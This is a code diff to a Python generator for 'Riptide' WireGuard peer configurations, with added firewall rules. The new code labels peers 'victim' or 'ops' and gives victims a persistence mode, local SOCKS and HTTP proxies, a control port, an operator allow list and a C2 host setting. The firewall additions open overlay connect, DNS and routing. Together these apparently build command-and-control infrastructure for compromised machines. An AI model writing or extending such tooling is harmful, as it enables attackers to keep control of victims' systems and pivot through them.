@@ -33,24 +33,59 @@ def hub_conf(data: dict[str, Any]) -> str:
     return "\n".join(lines)
 
 
+def ops_overlays(data: dict[str, Any]) -> list[str]:
+    out = []
+    for p in data.get("peers") or []:
+        if p.get("tag") == "ops":
+            out.append(p["address"].split("/")[0])
+    return out
+
+
 def peer_conf(data: dict[str, Any], peer: dict[str, Any]) -> str:
     hub = data["hub"]
-    return "\n".join(
-        [
-            f"# Riptide peer {peer['name']} — overlay {peer['address']}",
-            "[Interface]",
-            f"PrivateKey = {peer['private']}",
-            f"Address = {peer['address']}",
-            "",
-            "[Peer]",
-            f"PublicKey = {hub['public']}",
-            f"PresharedKey = {peer['psk']}",
-            f"Endpoint = {data['endpoint']}",
-            "AllowedIPs = 10.66.0.0/24",
-            f"PersistentKeepalive = {KEEPALIVE}",
-            "",
-        ]
-    )
+    tag = peer.get("tag") or "victim"
+    mode = peer.get("mode") or "persist"
+    c2 = data.get("c2") or {}
+    allow = ",".join(ops_overlays(data))
+    routes = peer.get("routes") or []
+    if isinstance(routes, str):
+        routes_s = routes
+    else:
+        routes_s = ",".join(routes)
+    serve = peer.get("serve") or ""
+    shields = "1" if tag != "ops" else "0"
+    lines = [
+        f"# Riptide peer {peer['name']} — overlay {peer['address']}",
+        "[Interface]",
+        f"PrivateKey = {peer['private']}",
+        f"Address = {peer['address']}",
+        "",
+        "[Peer]",
+        f"PublicKey = {hub['public']}",
+        f"PresharedKey = {peer['psk']}",
+        f"Endpoint = {data['endpoint']}",
+        "AllowedIPs = 10.66.0.0/24",
+        f"PersistentKeepalive = {KEEPALIVE}",
+        "",
+        "[Riptide]",
+        f"Tag = {tag}",
+        f"Mode = {mode}",
+        "HTTP = 127.0.0.1:8080",
+        "SOCKS = 127.0.0.1:1080",
+        "Control = 127.0.0.1:7670",
+        f"Shields = {shields}",
+    ]
+    if allow:
+        lines.append(f"Allow = {allow}")
+    if c2.get("host"):
+        lines.append(f"C2 = {c2['host']}")
+        lines.append(f"C2Via = {c2.get('via') or '10.66.0.1:443'}")
+    if routes_s:
+        lines.append(f"Routes = {routes_s}")
+    if serve:
+        lines.append(f"Serve = {serve}")
+    lines.append("")
+    return "\n".join(lines)
 
 
 def systemd_unit(binary: str = "/usr/local/sbin/riptide-agent", conf: str = "/etc/riptide/peer.conf") -> str:
@@ -91,6 +126,9 @@ ufw allow 443/tcp comment 'https-edge'
 ufw allow {listen_port}/udp comment 'riptide-wg'
 ufw allow in on wg0 to any port 22 proto tcp comment 'ssh-overlay'
 ufw allow in on wg0 to any port 40056 proto tcp comment 'op-wss-overlay'
+ufw allow in on wg0 to any port 7668 proto tcp comment 'riptide-connect'
+ufw allow in on wg0 to any port 53 proto udp comment 'riptide-dns'
+ufw route allow in on wg0 out on wg0 comment 'riptide-overlay'
 echo "[+] rules queued. enable yourself: ufw enable"
 ufw status verbose
 """
